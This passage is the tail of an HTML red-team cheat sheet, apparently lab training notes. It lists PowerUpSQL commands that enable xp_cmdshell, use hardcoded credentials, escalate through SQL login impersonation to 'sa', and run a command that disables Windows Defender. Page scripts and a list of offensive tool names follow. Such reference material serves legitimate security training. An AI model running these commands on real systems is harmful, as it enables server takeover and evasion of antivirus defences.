+<span class="hljs-comment"># DB Query to enable XP_CMDSHELL</span>
+Invoke-SQLCmd -Query <span class="hljs-string">"EXECUTE('sp_configure ''show advanced options'', 1; reconfigure') AT "</span><span class="hljs-string">"db-sqlsrv"</span><span class="hljs-string">""</span>
+Invoke-SQLCmd -Query <span class="hljs-string">"EXECUTE('sp_configure ''xp_cmdshell'', 1; reconfigure') AT "</span><span class="hljs-string">"db-sqlsrv"</span><span class="hljs-string">""</span>
+
+<span class="hljs-comment"># Use specific credentials to query db</span>
+Get-SQLQuery -Verbose -Instance <span class="hljs-string">"172.16.5.150,1433"</span> -username <span class="hljs-string">"inlanefreight\damundsen"</span> -password <span class="hljs-string">"SQL1234!"</span> -query <span class="hljs-string">'Select @@version'</span>
+
+<span class="hljs-comment"># Check for Impersonation attack</span>
+Invoke-SQLAuditPrivImpersonateLogin -Instance &lt;SQL INSTANCE&gt; -Verbose -Debug -Exploit
+
+Get-SQLServerLinkCrawl -Instance &lt;INSTANCE&gt; -Verbose -Query <span class="hljs-string">'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = '</span><span class="hljs-string">'IMPERSONATE'</span><span class="hljs-string">''</span>
+
+<span class="hljs-comment"># Impersonate user and execute db query</span>
+Get-SQLQuery -Query <span class="hljs-string">"EXECUTE AS LOGIN = 'sqladmin';  select system_user"</span> -Instance sqldb.organicsecurity.local
+
+Get-SQLQuery -Query <span class="hljs-string">"EXECUTE AS LOGIN = 'sqladmin'; EXECUTE AS LOGIN = 'sa';  select system_user"</span> -Instance sqldb.organicsecurity.local
+
+<span class="hljs-comment"># Execute OS level command by impersonating the user</span>
+Get-SQLQuery -Query <span class="hljs-string">"EXECUTE AS LOGIN = 'sqladmin';  EXECUTE AS LOGIN = 'sa'; exec master..xp_cmdshell 'powershell -c ''Set-MpPreference -DisableRealtimeMonitoring <span class="hljs-variable">$true</span>'''"</span> -Instance sqldb.organicsecurity.local
+
+</code></pre>
+<h4 class="code-line" data-line-start=1277 data-line-end=1278 ><a id="Reference_1277"></a>Reference:</h4>
+<p class="has-line-data" data-line-start="1278" data-line-end="1280"><a href="https://github.com/0xJs/CRTE-Cheatsheet/blob/main/README.md">https://github.com/0xJs/CRTE-Cheatsheet/blob/main/README.md</a><br>
+<a href="https://www.alteredsecurity.com/redteamlab">https://www.alteredsecurity.com/redteamlab</a></p>
+
+</body></html>
+
+
+<a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="vendor/purecounter/purecounter.js"></script>
+  <script src="vendor/aos/aos.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="vendor/typed.js/typed.min.js"></script>
+  <script src="vendor/waypoints/noframework.waypoints.js"></script>
+  <script src="vendor/php-email-form/validate.js"></script>
+
+  <!-- Prism JS -->
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="js/main.js"></script>
+
+  <!-- Prism JS Additional Keywords-->
+  <script>
+    Prism.languages.bash = Prism.languages.extend('bash', {
+      'function': /\b(?:aircrack-ng|amap|arpspoof|beef|bettercap|bloodhound|burpsuite|ldapsearch|cain|crackmapexec|cewl|curl|cd|dirb|dnsenum|dnsspoof|dnstracer|enum4linux|ettercap|echo|xfreerdp|rdesktop|chmod|mv|sudo|ssh|find|etterfilter|exploitdb|ftp|gobuster|hashcat|hashid|hash-identifier|hydra|httrack|smbmap|impacket-GetNPUsers|impacket-GetTGT|impacket-psexec|impacket-secretsdump|impacket-smbexec|ike-scan|john|kerbrute|linenum|linpeas|ls|maltego|masscan|medusa|metasploit|mimikatz|ms08-067|msfcli|msfconsole|msfupdate|msfvenom|nbtscan|nc|netcat|netdiscover|netstat|nikto|nmap|nslookup|openssh|patator|ping|powershell-empire|powersploit|proxychains|psexec|python|python2|python2.7|python3|reaver|responder|scp|searchsploit|setoolkit|shellshock|smtp-user-enum|smbclient|snmp-check|snmpwalk|sparta|sqlmap|sqlninja|sslscan|sublist3r|tcpdump|telnet|whois|theHarvester|tmux|tshark|ticketer|unicornscan|veil|volatility|wfuzz|whatweb|wireshark|windows-exploit-suggester|w3af|xsser|xsstrike|rpcclient|zaproxy)\b/
+    });
+  </script>
+  <script>
+    Prism.languages.powershell = Prism.languages.extend('powershell', {
+      'function': /\b(?:Add-ADGroupMember|Add-Computer|Add-Content|Add-ExchangeAdministrator|Add-Member|Add-Type|Checkpoint-Computer|Clear-Content|Clear-History|Clear-Item|Clear-ItemProperty|Clear-Variable|Compare-Object|ConvertFrom-Json|ConvertTo-Json|Copy-Item|Copy-ItemProperty|Disable-ADAccount|Disable-PSRemoting|Enable-ADAccount|Enable-PSRemoting|Export-Csv|Export-ModuleMember|Export-PSSession|Find-Module|Get-ADComputer|Get-ADDomain|Get-ADGroup|Get-ADUser|Get-Alias|Get-AuthenticodeSignature|Get-ChildItem|Get-Clipboard|Get-Command|Get-Content|Get-Credential|Get-Date|Get-EventLog|Get-Help|Get-History|Get-Item|Get-ItemProperty|Get-LocalGroupMember|Get-Location|Get-Member|Get-Module|Get-Process|Get-Service|Get-Variable|Get-WinEvent|Import-Csv|Import-Module|Invoke-Command|Invoke-Expression|Invoke-RestMethod|Invoke-WebRequest|Measure-Object|Move-Item|New-ADUser|New-Alias|New-Item|New-Module|New-PSDrive|New-PSSession|Out-File|Read-Host|Remove-ADUser|Remove-Item|Remove-Module|Remove-PSDrive|Remove-Variable|Restart-Computer|Restore-Computer|Select-Object|Set-ADUser|Set-Alias|Set-Content|Set-Date|Set-Item|Set-Location|Set-Variable|Start-Process|Stop-Process|Test-Connection|Test-Path|Update-Help|Write-Host|Write-Output)\b/
+    });
+  </script>
+
+  <script>
+    let allOpen = false; // Track the state of the dropdowns
+
+    function toggleIndex() {
+      const index = document.getElementById('index');
+      index.classList.toggle('open');
+    }
+
+    function toggleAll() {
+      const dropdownContainers = document.querySelectorAll('.dropdown-container, .nested-dropdown-container');
+      const buttons = document.querySelectorAll('.dropdown-btn, .nested-dropdown-btn');
+
+      // Set the new state based on the current state
+      allOpen = !allOpen;
+
+      for (let i = 0; i < dropdownContainers.length; i++) {
+        const container = dropdownContainers[i];
+        const btn = buttons[i];
+        if (allOpen) {
+          container.style.display = 'block';
+          btn.classList.add('active');
+        } else {
+          container.style.display = 'none';
+          btn.classList.remove('active');
+        }
+      }
+    }
+
+    const dropdownBtns = document.getElementsByClassName("dropdown-btn");
+    for (let i = 0; i < dropdownBtns.length; i++) {
+      dropdownBtns[i].addEventListener("click", function () {
+        this.classList.toggle("active");
+        const dropdownContent = this.nextElementSibling;
+        if (dropdownContent.style.display === "block") {
+          dropdownContent.style.display = "none";
+        } else {
+          dropdownContent.style.display = "block";
+        }
+      });
+    }
+
+    const nestedDropdownBtns = document.getElementsByClassName("nested-dropdown-btn");
+    for (let i = 0; i < nestedDropdownBtns.length; i++) {
+      nestedDropdownBtns[i].addEventListener("click", function () {
+        this.classList.toggle("active");
+        const nestedDropdownContent = this.nextElementSibling;
+        if (nestedDropdownContent.style.display === "block") {
+          nestedDropdownContent.style.display = "none";
+        } else {
+          nestedDropdownContent.style.display = "block";
+        }
+      });
+    }
+
+    setTimeout(function () {
+      var alert = document.querySelector('.alert-warning');
+      if (alert) {
+        var bootstrapAlert = new bootstrap.Alert(alert);
+        bootstrapAlert.close();
+      }
+    }, 7000); // 7 seconds
+
+    function removeHighlights(element) {
+      element.innerHTML = element.innerHTML.replace(/<\/?strong>/gi, "");
+    }
+
+    function highlightTerm(element, term) {
+      const regex = new RegExp(`(${term})`, 'gi');
+      element.innerHTML = element.innerHTML.replace(regex, "<strong>$1</strong>");
+    }
+
+    document.getElementById("search-input").addEventListener("input", function () {
+      const searchTerm = this.value.toLowerCase();
+      const headings = document.querySelectorAll(".cheatsheet-content h2, .cheatsheet-content h3, .cheatsheet-content h4, .cheatsheet-content h5, .cheatsheet-content h6");
+      let anyMatch = false;
+
+      headings.forEach((heading) => {
+        const text = heading.textContent.toLowerCase();
+        const sectionContent = [];
+
+        // Get all sibling elements until the next heading
+        let sibling = heading.nextElementSibling;
+        while (sibling && !sibling.matches("h2, h3, h4, h5, h6")) {
+          sectionContent.push(sibling);
+          sibling = sibling.nextElementSibling;
+        }
+
+        // Remove existing highlights
+        removeHighlights(heading);
+
+        // Only show headings and content that match the search term
+        if (text.includes(searchTerm)) {
+          heading.style.display = "";
+          sectionContent.forEach((elem) => (elem.style.display = ""));
+          if (searchTerm) {
+            highlightTerm(heading, searchTerm);
+          }
+
+          anyMatch = true;
+        } else {
+          // Hide non-matching headings and content
+          heading.style.display = "none";
+          sectionContent.forEach((elem) => (elem.style.display = "none"));
+        }
+      });
+
+      const noMatchMessage = document.getElementById("no-match-message");
+      if (!anyMatch) {
+        if (!noMatchMessage) {
+          const message = document.createElement("p");
+          message.id = "no-match-message";
+          message.className = "text-danger mt-3";
+          message.textContent = "No matches found.";
+          document.querySelector(".cheatsheet-content").appendChild(message);
+        }
+      } else if (noMatchMessage) {
+        noMatchMessage.remove();
+      }
+    });
+
+    function toggleSubmenu(event) {
+      event.preventDefault(); // Prevents navigation
+      const submenu = event.currentTarget.nextElementSibling;
+      const arrow = event.currentTarget.querySelector('.arrow');
+
+      submenu.classList.toggle('open'); // Toggle the submenu visibility
+      // Rotate the arrow based on whether the submenu is open
+      if (submenu.classList.contains('open')) {
+        arrow.style.transform = 'rotate(0deg)'; // Arrow points right when closed
+      } else {
+        arrow.style.transform = 'rotate(-90deg)';  // Arrow points down when open
+      }
+    }
+  </script>
+
+</body>
+
+
+</html>
